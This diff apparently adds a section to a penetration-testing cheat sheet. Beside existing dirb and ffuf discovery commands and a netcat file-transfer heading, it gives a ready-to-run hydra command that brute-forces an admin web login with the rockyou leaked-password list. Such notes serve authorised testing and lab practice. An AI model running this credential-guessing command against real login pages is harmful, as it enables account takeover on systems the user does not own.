@@ -13,6 +13,11 @@ dirb http://<host>/
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<host> -H "Host: FUZZ.<host>" -mc 200 -fs 15949 -o ffuf_output.json -of json
 ```
 
+## Login brute-force with `hyra`:
+```bash
+sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt http-post-form://example.com/login"&username=^USER^&password=^PASS^:F=Bad"
+```
+
 ## Send directory with `netcat`
 ### Sender:
 ```bash
